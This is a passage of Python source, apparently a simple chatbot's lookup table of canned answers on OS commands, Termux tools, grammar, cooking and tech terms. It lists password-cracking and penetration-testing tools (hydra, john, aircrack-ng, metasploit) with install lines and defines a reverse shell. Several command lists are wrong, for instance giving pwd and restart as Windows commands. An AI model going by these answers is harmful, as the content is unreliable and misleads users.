fdisk: Partition management.
mkfs: Create a file system.
mount: Mount a file system.
umount: Unmount a file system.

Search and Find:

grep: Search for patterns in files.
which: Locate a command.
whereis: Locate binary, source, and man page for a command.
man: Show the manual for a command.

System Control:

reboot: Reboot the system.
shutdown: Shutdown the system.
halt: Stop the system.
kill: Terminate a process.""",

        frozenset({
            "what is macos commands",
            "write all macos commands",
            "all macos commands",
            "all mac os commands",
            "macos all commands",
            "what is macos commands?",
            "macos commands",
            "show me macos commands",
            "macos all commands",
            "tell me all macos commands",
            "tell me macos commands",
            "can you write all macos commands",
            "can you write macos all commands",
            "can you write all macos commands?",
            "can you write macos all commands?",
            "all macos commands"
        }): """ 
File and Directory Management:

ls: List files in a directory.
cd: Change directory.
pwd: Print working directory.
mkdir: Make a new directory.
rmdir: Remove an empty directory.
rm: Remove files or directories.
cp: Copy files or directories.
mv: Move or rename files/directories.
touch: Create an empty file.
find: Search for files.
locate: Find files by name.

File Viewing and Editing:

cat: Display contents of a file.
more: View file contents (page by page).
less: View file contents (scrollable).
head: View the first few lines of a file.
tail: View the last few lines of a file.
nano: Text editor.
vi/vim: Text editor.

Permissions and Ownership:

chmod: Change file permissions.
chown: Change file owner.
chgrp: Change file group.

System Information:

df: Display disk space usage.
du: Show file and directory space usage.
free: Display memory usage.
top: View running processes.
ps: List processes.
uptime: Show system uptime.
uname: Display system information.
hostname: Show or set the system's hostname.

Networking:

ping: Check network connection.
ifconfig: Display network interfaces.
netstat: Network statistics.
scp: Secure copy files over SSH.
ssh: Securely connect to remote machines.
curl: Transfer data from or to a server.

Package Management:

brew: Package management for macOS (Homebrew).
brew install: Install a package using Homebrew.
brew update: Update Homebrew.
brew upgrade: Upgrade installed packages using Homebrew.
brew uninstall: Uninstall a package using Homebrew.

Archiving and Compression:

tar: Archive files.
tar -cvf: Create a tar archive.
tar -xvf: Extract a tar archive.
gzip: Compress files.
gunzip: Decompress files.

User and Group Management:

useradd: Add a new user (via sudo).
usermod: Modify user account (via sudo).
userdel: Delete a user (via sudo).
groupadd: Add a new group (via sudo).
passwd: Change user password.

Disk Management:

diskutil: Disk utility for macOS (e.g., format, repair disks).
hdiutil: Create, mount, and manage disk images.
mount: Mount a file system.
umount: Unmount a file system.

Search and Find:

grep: Search for patterns in files.
which: Locate a command.
whereis: Locate binary, source, and man page for a command.
man: Show the manual for a command.
find: Search for files and directories.
mdfind: Search for files using Spotlight.

System Control:

reboot: Reboot the system.
shutdown: Shutdown the system.
halt: Stop the system.
kill: Terminate a process.
pmset: Power management settings (e.g., sleep, wake).""",
        frozenset({
            "what is windows commands",
            "write all windows commands",
            "what is windows commands?",
            "windows commands",
            "all windows commands",
            "windows all commands",
            "show me windows commands",
            "windows all commands",
            "tell me all windows commands",
            "tell me windows commands",
            "can you write all windows commands",
            "can you write windows all commands",
            "can you write all windows commands?",
            "can you write windows all commands?",
            "all windows commands"
        }): """ 
File and Directory Management:

dir: List files in a directory.
cd: Change directory.
pwd: Print working directory.
mkdir: Make a new directory.
rmdir: Remove an empty directory.
del: Delete files.
copy: Copy files.
move: Move or rename files.
rename: Rename files.
type: Display contents of a file.
xcopy: Copy files and directories.
robocopy: Advanced copy files and directories.

File Viewing and Editing:

notepad: Open Notepad text editor.
edit: Open the old DOS-based text editor (not available in modern Windows versions).
more: View file contents (page by page).
find: Search for a string in files.

Permissions and Ownership:

attrib: Change file attributes.
icacls: Change file and directory permissions.
takeown: Take ownership of a file or folder.

System Information:

cls: Clear the screen.
echo: Display a message or set a variable.
tasklist: List running processes.
taskkill: Terminate a process.
systeminfo: Display system information.
hostname: Display the system's hostname.
ver: Display Windows version.
wmic: Windows Management Instrumentation command-line utility.

Networking:

ping: Check network connection.
ipconfig: Display network interfaces and IP configuration.
netstat: Show network statistics and open connections.
tracert: Trace the route to a remote host.
nslookup: Query DNS records.
netsh: Configure network settings.
telnet: Connect to a remote host via Telnet (not installed by default).

Package Management:

choco: Package manager for Windows (Chocolatey).
winget: Windows Package Manager (installed by default in Windows 10/11).
npm: Node.js package manager for JavaScript packages.

Disk Management:

diskpart: Disk partitioning tool.
chkdsk: Check and repair disk.
format: Format a disk or partition.
diskutil: Disk utility for macOS, but you can use diskpart on Windows.

Search and Find:

findstr: Search for patterns in files.
where: Locate a file or command in the system.
dir /s: Search for a file in the directory and subdirectories.

System Control:

shutdown: Shut down the system.
restart: Restart the system.
sleep: Put the system to sleep.
logoff: Log off the current user.
exit: Exit the Command Prompt.""",

        frozenset({
            "what is an adjective",
            "define adjective",
            "what is adjective",
            "what is an adjective in grammar",
            "what is an adjective?",
            "define adjective?",
            "what is adjective?",
            "what is an adjective in grammar?"
        }): "An adjective is a part of speech that describes or modifies a noun or pronoun.",

        frozenset({
            "write all termux tools",
            "define termux tools",
            "write list of termux tools",
            "all termux tools",
            "all termux tools list",
            "what are some termux tools lists",
            "what are some termux tools lists?",
            "write all termux tools",
            "termux tools list",
            "termux list tools",
            "termux list of tools"
        }): """
1. apt - Package management tool (like apt-get for Debian/Ubuntu).
   - Definition: Used for installing, upgrading, and removing packages.
   - Install: 'pkg install apt'

2. curl - Command-line tool for transferring data.
   - Definition: Used to download files from the internet.
   - Install: 'pkg install curl'

3. git - Version control system.
   - Definition: Tracks changes in source code during software development.
   - Install: 'pkg install git'

4. vim - Text editor.
   - Definition: A highly configurable text editor for editing code.
   - Install: 'pkg install vim'

5. python - Python programming language.
   - Definition: Allows you to write and run Python scripts.
   - Install: 'pkg install python'

6. nano - Text editor.
   - Definition: A simple text editor for the terminal.
   - Install: 'pkg install nano'

7. wget - Command-line tool for downloading files.
   - Definition: Used to download files via HTTP, HTTPS, and FTP.
   - Install: 'pkg install wget'

8. nmap - Network scanning tool.
   - Definition: Used for network discovery and security auditing.
   - Install: 'pkg install nmap'

9. unzip - Extracts compressed zip files.
   - Definition: Tool for unzipping files.
   - Install: 'pkg install unzip'

10. openssh - SSH server and client.
   - Definition: Used for secure communication between computers over a network.
   - Install: 'pkg install openssh'

11. tmux - Terminal multiplexer.
   - Definition: Allows you to split terminal windows into multiple panes.
   - Install: 'pkg install tmux'

12. nc (netcat) - Network tool for reading and writing network connections.
   - Definition: Used for debugging and investigating the network.
   - Install: 'pkg install netcat'

13. htop - Interactive process viewer.
   - Definition: Shows system processes in a user-friendly manner.
   - Install: 'pkg install htop'

14. ffmpeg - Multimedia framework.
   - Definition: Used for processing video, audio, and other multimedia files.
   - Install: 'pkg install ffmpeg'

15. termux-tools - A collection of Termux utilities.
   - Definition: Provides various tools for improving the Termux environment.
   - Install: 'pkg install termux-tools'

16. nethunter - Kali Linux's penetration testing tools for Termux.
   - Definition: A set of tools for ethical hacking and penetration testing.
   - Install: 'pkg install nethunter'

17. metasploit - Penetration testing framework.
   - Definition: Framework for testing and exploiting vulnerabilities.
   - Install: 'pkg install metasploit'

18. hydra - Password cracking tool.
   - Definition: Used for performing dictionary-based password attacks.
   - Install: 'pkg install hydra'

19. john - Password cracking tool.
   - Definition: Cracks passwords using various algorithms and methods.
   - Install: 'pkg install john'

20. aircrack-ng - Wireless network security tool.
   - Definition: Used to crack WEP and WPA-PSK keys on wireless networks.
   - Install: 'pkg install aircrack-ng'

21. python2 - Older version of Python programming language.
   - Definition: Installs the Python 2 interpreter for legacy scripts.
   - Install: 'pkg install python2'

22. gcc - C and C++ compiler.
   - Definition: Used to compile C and C++ programs.
   - Install: 'pkg install clang'

23. perl - Perl programming language.
   - Definition: High-level programming language for text processing.
   - Install: 'pkg install perl'

24. ruby - Ruby programming language.
   - Definition: A high-level programming language used for web development and scripting.
   - Install: 'pkg install ruby'

25. zsh - Z shell.
   - Definition: A shell that can be used instead of Bash with advanced features.
   - Install: 'pkg install zsh'

26. golang - Go programming language.
   - Definition: A statically typed programming language designed at Google.
   - Install: 'pkg install golang'

27. clang - C, C++, and Objective-C compiler.
   - Definition: Used to compile C/C++ programs.
   - Install: 'pkg install clang'

28. adb - Android Debug Bridge.
   - Definition: Used for interacting with Android devices over USB.
   - Install: 'pkg install android-tools'

29. sqlite - SQL database engine.
   - Definition: A self-contained, serverless SQL database engine.
   - Install: 'pkg install sqlite'

30. jq - Command-line JSON processor.
   - Definition: Used for parsing, filtering, and transforming JSON data.
   - Install: 'pkg install jq'

31. socat - Multipurpose relay for bidirectional data transfer.
   - Definition: Used for relaying data between two endpoints.
   - Install: 'pkg install socat'

32. wget - Network downloader.
   - Definition: Retrieves content from web servers using HTTP or FTP.
   - Install: 'pkg install wget'

33. nmap - Network scanning tool.
   - Definition: Used for discovering hosts and services on a computer network.
   - Install: 'pkg install nmap'

34. ping - Network testing command.
   - Definition: Used to check the reachability of a network host.
   - Install: 'pkg install iputils'

35. curl - Command-line tool for data transfer.
   - Definition: Allows downloading or sending data over the internet.
   - Install: 'pkg install curl'

36. fakeroot - Tool for simulating root privileges.
   - Definition: Simulates the root environment for compiling packages.
   - Install: 'pkg install fakeroot'

37. rsync - Remote file synchronization tool.
   - Definition: Used to synchronize files and directories between two locations.
   - Install: 'pkg install rsync' """,

        frozenset({
            "what is a pronoun",
            "define pronoun",
            "what is pronoun",
            "what is a pronoun in grammar",
            "what is a pronoun?",
            "define pronoun?",
            "what is pronoun?",
            "what is a pronoun in grammar?"
        }): "A pronoun is a word that takes the place of a noun, such as 'he', 'she', 'it', or 'they'.",

        frozenset({
            "what is a sentence",
            "define sentence",
            "what is sentence",
            "what makes a sentence",
            "what is a sentence?",
            "define sentence?",
            "what is sentence?",
            "what makes a sentence?"
        }): "A sentence is a group of words that expresses a complete thought and contains a subject and a predicate.",

        frozenset({
            "what is a poem",
            "define poem",
            "what is poetry",
            "what is a poem?",
            "define poem?",
            "what is poetry?"
        }): "A poem is a form of literary expression that uses rhythmic and often figurative language to evoke emotions, thoughts, and images.",

        frozenset({
            "what is a metaphor",
            "define metaphor",
            "what is metaphor in literature",
            "what is a metaphor?",
            "define metaphor?",
            "what is metaphor in literature?"
        }): "A metaphor is a figure of speech that compares two things without using 'like' or 'as', stating that one thing is another.",

        frozenset({
            "what is simile",
            "define simile",
            "what is a simile",
            "what is simile?",
            "define simile?",
            "what is a simile?"
        }): "A simile is a figure of speech that compares two things using 'like' or 'as'.",

        frozenset({
            "what is alliteration",
            "define alliteration",
            "what is alliteration in poetry",
            "what is alliteration?",
            "define alliteration?",
            "what is alliteration in poetry?"
        }): "Alliteration is the repetition of the same consonant sound at the beginning of words in a sentence or phrase.",

        frozenset({
            "what is a haiku",
            "define haiku",
            "what is a haiku poem",
            "what is a haiku?",
            "define haiku?",
            "what is a haiku poem?"
        }): "A haiku is a traditional form of Japanese poetry that consists of three lines with a 5-7-5 syllable pattern.",

        frozenset({
            "what is an essay",
            "define essay",
            "what is essay writing",
            "what is an essay?",
            "define essay?",
            "what is essay writing?"
        }): "An essay is a short piece of writing on a particular subject, often presenting an argument or a perspective.",

        frozenset({
            "what is an idiom",
            "define idiom",
            "what is an idiomatic expression",
            "what is an idiom?",
            "define idiom?",
            "what is an idiomatic expression?"
        }): "An idiom is a phrase or expression whose meaning is not literal but understood through common use, like 'kick the bucket' meaning 'to die'.",

        frozenset({
            "what is irony",
            "define irony",
            "what is irony in literature",
            "what is irony?",
            "define irony?",
            "what is irony in literature?"
        }): "Irony is a literary device where the expected outcome is different from what actually happens, or when words are used in a way that their intended meaning is opposite to their literal meaning.",

        frozenset({
            "what is foreshadowing",
            "define foreshadowing",
            "what is foreshadowing in literature",
            "what is foreshadowing?",
            "define foreshadowing?",
            "what is foreshadowing in literature?"
        }): "Foreshadowing is a literary technique where hints or clues are given about what will happen later in the story.",

        frozenset({
            "what is symbolism",
            "define symbolism",
            "what is symbolism in literature",
            "what is symbolism?",
            "define symbolism?",
            "what is symbolism in literature?"
        }): "Symbolism is the use of symbols to represent ideas or qualities beyond their literal meaning in literature.",

        frozenset({
            "what is reverse shell",
            "define reverse shell",
            "explain reverse shell",
            "tell me what is reverse shell",
            "what is reverse shell",
            "what is mini reverse shell",
            "define mini reverse shell",
            "what is mini reverse shell?"
        }): "A reverse shell is a type of connection where the victim's computer connects back to the attacker's computer. It allows the attacker to control the victim's system remotely by sending commands, as if they were using the victim's command line interface.",

        frozenset({
            "what is a character in literature",
            "define character",
            "what is a character in a story",
            "what is a character in literature?",
            "define character?",
            "what is a character in a story?"
        }): "A character is a person or figure in a story, novel, or play, with distinct qualities and traits that shape the narrative.",

        frozenset({
            "what is a plot",
            "define plot",
            "what is plot in literature",
            "what is a plot?",
            "define plot?",
            "what is plot in literature?"
        }): "The plot is the sequence of events in a story, including the introduction, rising action, climax, falling action, and resolution.",

        frozenset({
            "what is a climax in a story",
            "define climax",
            "what is climax in literature",
            "what is a climax in a story?",
            "define climax?",
            "what is climax in literature?"
        }): "The climax is the turning point or most intense part of a story, often marking the point of greatest conflict or tension.",

        frozenset({
            "what is the setting of a story",
            "define setting",
            "what is the setting in literature",
            "what is the setting of a story?",
            "define setting?",
            "what is the setting in literature?"
        }): "The setting is the time, place, and environment in which the story takes place.",

        frozenset({
            "what is a genre",
            "define genre",
            "what are literary genres",
            "what is a genre?",
            "define genre?",
            "what are literary genres?"
        }): "A genre is a category or type of literature, such as fiction, non-fiction, drama, poetry, and more.",

        frozenset({
            "what is a theme in literature",
            "define theme",
            "what is theme in a story",
            "what is a theme in literature?",
            "define theme?",
            "what is theme in a story?"
        }): "The theme is the central idea or underlying message in a work of literature.",

        frozenset({
            "what is a protagonist",
            "define protagonist",
            "who is the protagonist in a story",
            "what is a protagonist?",
            "define protagonist?",
            "who is the protagonist in a story?"
        }): "The protagonist is the main character in a story, typically involved in the central conflict.",

        frozenset({
            "what is an antagonist",
            "define antagonist",
            "who is the antagonist in a story",
            "what is an antagonist?",
            "define antagonist?",
            "who is the antagonist in a story?"
        }): "The antagonist is a character or force in conflict with the protagonist, often creating the primary obstacle in the narrative.",

        frozenset({
            "you are so stupid",
            "u r so stupid",
            "u r stupid",
            "you are stupid",
            "you are stupid ass",
            "you are no. 1 stupid ass in the world",
            "u r so stupid ass"
        }): "I am sorry, but i am keep improving..",

        frozenset({
            "what is a narrator",
            "define narrator",
            "who is the narrator in a story",
            "what is a narrator?",
            "define narrator?",
            "who is the narrator in a story?"
        }): "The narrator is the voice or perspective from which the story is told.",

        frozenset({
            "what is a fable",
            "define fable",
            "what is a fable in literature",
            "what is a fable?",
            "define fable?",
            "what is a fable in literature?"
        }): "A fable is a short story that typically features animals as characters and teaches a moral lesson.",

        frozenset({
            "what is a proverb",
            "define proverb",
            "what is a proverb",
            "what is a proverb?",
            "define proverb?",
            "what is a proverb?"
        }): "A proverb is a short, well-known saying that expresses a general truth or piece of advice, such as 'actions speak louder than words.'",

        frozenset({
            "what is pollution",
            "define pollution",
            "explain pollution",
            "what causes pollution"
        }): "Pollution refers to the introduction of harmful substances or contaminants into the environment, causing adverse effects on nature, human health, and ecosystems. It can result from human activities or natural events.",

        frozenset({
            "what is air pollution",
            "define air pollution",
            "explain air pollution",
            "what causes air pollution"
        }): "Air pollution is the contamination of the atmosphere with harmful gases, particles, or biological molecules. Common causes include vehicle emissions, industrial activities, and burning of fossil fuels.",

        frozenset({
            "what is water pollution",
            "define water pollution",
            "explain water pollution",
            "what causes water pollution"
        }): "Water pollution occurs when harmful substances such as chemicals, waste, or microorganisms contaminate water bodies, making them unsafe for drinking, fishing, or other uses. Causes include industrial discharge, agricultural runoff, and sewage.",

        frozenset({
            "what is soil pollution",
            "define soil pollution",
            "explain soil pollution",
            "what causes soil pollution"
        }): "Soil pollution is the degradation of land due to the presence of toxic chemicals, heavy metals, or waste. It is caused by improper disposal of industrial waste, pesticides, and deforestation.",

        frozenset({
            "what is noise pollution",
            "define noise pollution",
            "explain noise pollution",
            "what causes noise pollution"
        }): "Noise pollution is the excessive or harmful levels of sound in the environment, typically caused by traffic, construction, industrial activities, and loud music, affecting both human and animal health.",

        frozenset({
            "what is light pollution",
            "define light pollution",
            "explain light pollution",
            "what causes light pollution"
        }): "Light pollution is the excessive or misdirected artificial light in the environment, often caused by streetlights, advertising boards, and urban sprawl. It disrupts ecosystems and obscures the night sky.",

        frozenset({
            "what is thermal pollution",
            "define thermal pollution",
            "explain thermal pollution",
            "what causes thermal pollution"
        }): "Thermal pollution occurs when industries or power plants release heat into water bodies or the air, raising temperatures and harming aquatic life or ecosystems.",

        frozenset({
            "what is plastic pollution",
            "define plastic pollution",
            "explain plastic pollution",
            "what causes plastic pollution"
        }): "Plastic pollution is the accumulation of plastic products in the environment, causing harm to wildlife and ecosystems. It results from improper disposal of plastic waste and excessive use of non-biodegradable plastics.",

        frozenset({
            "what is radioactive pollution",
            "define radioactive pollution",
            "explain radioactive pollution",
            "what causes radioactive pollution"
        }): "Radioactive pollution is caused by the release of radioactive substances into the environment, often due to nuclear accidents, improper disposal of nuclear waste, or mining activities. It poses severe risks to health and ecosystems.",

        frozenset({
            "how to boil an egg",
            "boiling egg steps",
            "how long to boil an egg",
            "what is the process to boil an egg",
            "how to boil an egg?",
            "boiling egg steps?",
            "how long to boil an egg?",
            "what is the process to boil an egg?"
        }): "To boil an egg, place it in a pot with enough water to cover it, bring the water to a boil, then reduce heat and simmer for 9-12 minutes depending on desired firmness. Then, cool the egg in cold water.",

        frozenset({
            "how to make pasta",
            "pasta making steps",
            "how to cook pasta",
            "how to make pasta?",
            "pasta making steps?",
            "how to cook pasta?"
        }): "To make pasta, bring a pot of salted water to a boil, add pasta, and cook for 8-10 minutes until al dente. Drain and serve with sauce of your choice.",

        frozenset({
            "what is the difference between baking and roasting",
            "baking vs roasting",
            "how are baking and roasting different",
            "what is the difference between baking and roasting?",
            "baking vs roasting?",
            "how are baking and roasting different?"
        }): "Baking typically involves cooking food by surrounding it with dry heat in an oven, while roasting is a method that usually applies to meats and vegetables, cooked at higher temperatures.",

        frozenset({
            "how to fry chicken",
            "steps for frying chicken",
            "how do you fry chicken",
            "how to fry chicken?",
            "steps for frying chicken?",
            "how do you fry chicken?"
        }): "To fry chicken, coat the chicken pieces in flour or batter, heat oil in a frying pan to 350°F, and cook the chicken for 10-15 minutes, turning until golden brown and cooked through.",

        frozenset({
            "what is sautéing",
            "define sautéing",
            "how do you sauté food",
            "what is sautéing?",
            "define sautéing?",
            "how do you sauté food?"
        }): "Sautéing is a cooking method where food is quickly cooked in a small amount of oil or butter over high heat, often stirring constantly to prevent burning.",

        frozenset({
            "how to make pancakes",
            "pancake recipe",
            "how to cook pancakes",
            "how to make pancakes?",
            "pancake recipe?",
            "how to cook pancakes?"
        }): "To make pancakes, mix flour, eggs, milk, and baking powder to form a batter. Pour onto a hot, greased griddle or frying pan, cooking each side for 2-3 minutes until golden brown.",

        frozenset({
            "what is grilling",
            "define grilling",
            "how does grilling work",
            "what is grilling?",
            "define grilling?",
            "how does grilling work?"
        }): "Grilling is a cooking method where food is placed on a grill rack over direct heat, usually from charcoal or gas, to cook it while adding smoky flavor.",

        frozenset({
            "what is stir frying",
            "define stir frying",
            "how do you stir fry",
            "what is stir frying?",
            "define stir frying?",
            "how do you stir fry?"
        }): "Stir-frying is a quick cooking method where ingredients are cooked in a small amount of oil over high heat while stirring constantly, often used for vegetables and meats.",

        frozenset({
            "how to make soup",
            "soup recipe",
            "how do you make soup",
            "how to make soup?",
            "soup recipe?",
            "how do you make soup?""how to make soup?",
            "soup recipe?",
            "how do you make soup?"
        }): "To make soup, sauté vegetables in a pot, add stock or water, bring to a boil, and simmer for 20-30 minutes. You can blend it for a smooth texture or serve it chunky.",

        frozenset({
            "what is a smoothie",
            "define smoothie",
            "how do you make a smoothie",
            "what is a smoothie?",
            "define smoothie?",
            "how do you make a smoothie?"
        }): "A smoothie is a blended drink made from fruits, vegetables, yogurt, or milk, often combined with ice or juice for a thick, refreshing texture.",

        frozenset({
            "how to make an omelette",
            "omelette recipe",
            "how to cook an omelette",
            "how to make an omelette?",
            "omelette recipe?",
            "how to cook an omelette?"
        }): "To make an omelette, beat eggs and pour into a hot, greased pan. Cook until the edges set, then add fillings like cheese, vegetables, or meat before folding.",

        frozenset({
            "what is marinating",
            "define marinating",
            "how does marinating work",
            "what is marinating?",
            "define marinating?",
            "how does marinating work?"
        }): "Marinating is the process of soaking food, typically meat or vegetables, in a seasoned liquid to enhance flavor and tenderness before cooking.",

        frozenset({
            "how to bake a cake",
            "cake recipe",
            "what are the steps to bake a cake",
            "how to bake a cake?",
            "cake recipe?",
            "what are the steps to bake a cake?"
        }): "To bake a cake, mix flour, sugar, eggs, and butter, add baking powder, pour into a cake pan, and bake in a preheated oven at 350°F for 25-30 minutes until a toothpick comes out clean.",

        frozenset({
            "what is poaching",
            "define poaching",
            "how do you poach food",
            "what is poaching?",
            "define poaching?",
            "how do you poach food?"
        }): "Poaching is a gentle cooking method where food, typically eggs, fish, or poultry, is simmered in water or broth at a low temperature, just below boiling point.",

        frozenset({
            "how to make rice",
            "rice cooking steps",
            "how to cook rice",
            "how to make rice?",
            "rice cooking steps?",
            "how to cook rice?"
        }): "To make rice, rinse the rice until the water runs clear, add it to boiling water or broth, and cook covered on low heat for 15-20 minutes until all water is absorbed.",

        frozenset({
            "what is the difference between grilling and barbecuing",
            "grilling vs barbecuing",
            "how are grilling and barbecuing different",
            "what is the difference between grilling and barbecuing",
            "grilling vs barbecuing",
            "how are grilling and barbecuing different"
        }): "Grilling is quick cooking over high heat, usually with direct contact with the heat source, while barbecuing involves slower cooking over indirect heat, often with smoke for flavor.",

        frozenset({
            "how to make salad",
            "salad recipe",
            "how do you make a salad",
            "how to make salad?",
            "salad recipe?",
            "how do you make a salad?"
        }): "To make a salad, combine various fresh vegetables like lettuce, tomatoes, cucumbers, and add toppings like cheese, nuts, or protein. Toss with dressing of choice.",

        frozenset({
            "what is blockchain",
            "define blockchain",
            "how does blockchain work",
            "what is the use of blockchain",
            "what is blockchain?",
            "define blockchain?",
            "how does blockchain work?",
            "what is the use of blockchain?"
        }): "Blockchain is a decentralized digital ledger that records transactions across multiple computers. It ensures transparency, security, and immutability of data.",

        frozenset({
            "what is cloud computing",
            "define cloud computing",
            "how does cloud computing work",
            "what is cloud technology",
            "what is cloud computing?",
            "define cloud computing?",
            "how does cloud computing work?",
            "what is cloud technology?"
        }): "Cloud computing is the delivery of computing services like storage, processing, and databases over the internet, allowing users to access data and software from any device with internet connectivity.",

        frozenset({
            "what is quantum computing",
            "define quantum computing",
            "how does quantum computing work",
            "what is quantum computing?",
            "define quantum computing?",
            "how does quantum computing work?"
        }): "Quantum computing uses quantum-mechanical phenomena like superposition and entanglement to perform computations at much higher speeds than classical computers.",

        frozenset({
            "what is 5g technology",
            "define 5g",
            "how does 5g work",
            "what are the advantages of 5g",
            "what is 5g technology?",
            "define 5g?",
            "how does 5g work?",
            "what are the advantages of 5g?"
        }): "5G is the fifth generation of mobile network technology, offering faster speeds, lower latency, and the ability to connect more devices simultaneously, enabling advancements in IoT and autonomous vehicles.",

        frozenset({
            "what is the internet of things",
            "define iot",
            "what is iot",
            "what is iot technology",
            "how does iot work",
            "what is the internet of things?",
            "define iot?",
            "what is iot technology?",
            "how does iot work?"
        }): "The Internet of Things (IoT) refers to the network of physical devices that connect to the internet and communicate with each other, such as smart home devices, wearables, and industrial sensors.",

        frozenset({
            "what is edge computing",
            "define edge computing",
            "what is edge technology",
            "what is edge computing technology",
            "how does edge computing work",
            "what is edge computing used for",
            "define edge computing? ",
            "what is edge computing in simple terms",
            "what is the purpose of edge computing"
        }): "Edge computing processes data closer to the location where it is generated, reducing latency and improving response times, especially in IoT applications, self-driving cars, and smart devices.",

        frozenset({
            "what is quantum computing",
            "define quantum computing",
            "how does quantum computing work",
            "what are quantum computers",
            "what is a qubit",
            "how does a quantum computer work",
            "what is the difference between classical and quantum computing",
            "what is quantum computing used for",
            "what problems can quantum computers solve"
        }): "Quantum computing uses quantum bits (qubits) that can exist in multiple states simultaneously, allowing it to solve complex problems faster than classical computers, such as simulating molecules or solving optimization problems.",

        frozenset({
            "what is blockchain technology",
            "how does blockchain work",
            "what is blockchain used for",
            "define blockchain",
            "is blockchain only for cryptocurrency",
            "how is blockchain used outside of crypto",
            "what are the benefits of blockchain",
            "what is blockchain in simple terms",
            "how does blockchain ensure security"
        }): "Blockchain is a distributed ledger technology that ensures secure, transparent transactions. It's used beyond cryptocurrencies in areas like supply chain management, digital identity, and secure record-keeping.",

        frozenset({
            "what is serverless computing",
            "define serverless computing",
            "how does serverless computing work",
            "what is serverless architecture",
            "how is serverless different from traditional hosting",
            "what are the benefits of serverless computing",
            "what are serverless platforms",
            "what is serverless technology",
            "what does serverless computing mean"
        }): "Serverless computing allows developers to run code without managing servers. Cloud services automatically handle scaling, reducing infrastructure complexity and costs.",

        frozenset({
            "what is rom",
            "define rom",
            "what is rom?",
            "full form of rom",
            "rom full form",
            "full form of rom?",
            "rom full form?"
        }): "ROM (Read-Only Memory): Permanent storage that contains essential instructions for starting the computer (e.g., BIOS). It is non-volatile, meaning it retains data even after power is off.",
        frozenset({
            "what is zero trust security",
            "define zero trust model",
            "how does zero trust security work",
            "what is the zero trust security model",
            "what are the principles of zero trust",
            "why is zero trust security important",
            "what is zero trust network security",
            "how does zero trust work",
            "what is the concept of zero trust security"
        }): "The Zero Trust model assumes no device or user is trusted by default, whether inside or outside the network. Every access request is thoroughly verified before being granted.",

        frozenset({
            "what is docker",
            "what is a container",
            "define docker",
            "how do containers work",
            "what is docker used for",
            "what is docker and containers",
            "how is docker different from virtual machines",
            "what is containerization",
            "what are the benefits of docker",
            "how does docker help in development"
        }): "Docker is a platform for developing, shipping, and running applications inside containers. Containers package software and its dependencies, ensuring it runs consistently across different environments.",

            frozenset({
            "what is machine learning bias",
            "define machine learning bias",
            "how does bias affect machine learning",
            "what is algorithmic bias",
            "how to prevent bias in machine learning",
            "why is bias a problem in machine learning",
            "how does bias affect machine learning models",
            "how do we fix bias in machine learning",
            "what causes bias in machine learning"
        }): "Machine learning bias occurs when an algorithm produces unfair or discriminatory results due to biased data or incorrect assumptions. It's important to address bias to ensure fairness in AI systems.",

        frozenset({
            "what is an fpga",
            "what is fpga",
            "what is fpga?",
            "define fpga",
            "how does fpga work",
            "what is a field-programmable gate array",
            "what are fpgas used for",
            "how is fpga different from a microprocessor",
            "why use fpga",
            "what is the purpose of fpga",
            "what is an fpga in simple terms"
        }): "FPGAs are programmable integrated circuits that can be configured to perform a wide range of tasks. They are used in high-performance applications like telecommunications, cryptocurrency mining, and scientific computing.",

        frozenset({
            "what is augmented reality",
            "define augmented reality",
            "what is ar",
            "how does augmented reality work",
            "what is augmented reality?",
            "define augmented reality?",
            "what is ar?",
            "how does augmented reality work?"
        }): "Augmented Reality (AR) overlays digital content, such as images or sounds, onto the real world, often through devices like smartphones or AR glasses, enhancing user interaction with their environment.",

        frozenset({
            "what is virtual reality",
            "define virtual reality",
            "what is vr",
            "how does virtual reality work",
            "what is virtual reality?",
            "define virtual reality?",
            "what is vr?",
            "how does virtual reality work?"
        }): "Virtual Reality (VR) creates a simulated environment using computer-generated images and sounds, often experienced through VR headsets, immersing users in an artificial world.",

        frozenset({
            "what is the difference between ai and machine learning",
            "how is ai different from machine learning",
            "what is the relation between ai and machine learning",
            "what is the difference between ai and machine learning?",
            "how is ai different from machine learning?",
            "what is the relation between ai and machine learning?"
        }): "AI refers to the broader concept of machines simulating human intelligence, while machine learning is a subset of AI that allows systems to learn from data and improve over time.",

        frozenset({
            "what is cybersecurity",
            "define cybersecurity",
            "what does cybersecurity mean",
            "why is cybersecurity important",
            "what is cybersecurity?",
            "define cybersecurity?",
            "what does cybersecurity mean?",
            "why is cybersecurity important?"
        }): "Cybersecurity is the practice of protecting computers, networks, and data from digital threats, such as hacking, viruses, and data breaches, to ensure the privacy and integrity of information.",

        frozenset({
            "what is an algorithm",
            "what is algorithm",
            "what is an algorithm?",
            "what is algorithm?"
            "define algorithm",
            "how do algorithms work",
            "what is the use of an algorithm",
            "what is an algorithm?",
            "define algorithm?",
            "how do algorithms work?",
            "what is the use of an algorithm?"
        }): "An algorithm is a set of step-by-step instructions or rules designed to perform a specific task or solve a problem. In computing, algorithms are used for tasks like searching, sorting, and processing data.",

        frozenset({
            "what is gpt fullform",
            "gpt full form",
            "gpt fullform",
            "fullform of gpt",
            "full form of gpt",
            "what is the gpt fullform",
            "what is gpt full form",
            "what is the gpt fullform",
            "gpt full form?",
            "gpt fullform",
            "fullform of gpt?",
            "full form of gpt?",
            "what is the gpt fullform?",
            "what is the full form of gpt",
            "what is gpt full form",
            "what is gpt fullform",
            "what is gpt full form?",
            "what is gpt fullfrorm?"
        }): "GPT stands for Generative Pre-training Transformer.",

        frozenset({
            "what is big data",
            "define big data",
            "how does big data work",
            "what is the importance of big data",
            "what is big data?",
            "define big data?",
            "how does big data work?",
            "what is the importance of big data?"
        }): "Big data refers to extremely large datasets that are analyzed computationally to uncover patterns, trends, and associations, especially relating to human behavior and interactions.",

        frozenset({
            "what is bio tech",
            "what is biotech",
            "what is bio tech?",
            "what is biotech",
            "what is bio tech?",
            "what is biotech?",
            "define bio tech",
            "define biotech",
            "explain biotech",
            "explain bio tech"
        }): "Biotechnology is the use of biology and technology to improve areas like medicine, agriculture, and environmental sustainability. In agriculture, it helps develop better crops, increase yields, and reduce environmental impact.",

        frozenset({
            "what is cryptocurrency",
            "define cryptocurrency",
            "what is crypto",
            "how does cryptocurrency work",
            "what is cryptocurrency?",
            "define cryptocurrency?",
            "what is crypto?",
            "how does cryptocurrency work?"
        }): "Cryptocurrency is a digital or virtual form of currency that uses cryptography for security. Bitcoin and Ethereum are examples of popular cryptocurrencies, often decentralized and based on blockchain technology.",

        frozenset({
            "what is a calorie deficit",
            "how does calorie deficit work",
            "what is the meaning of calorie deficit",
            "what is a calorie deficit?",
            "how does calorie deficit work?",
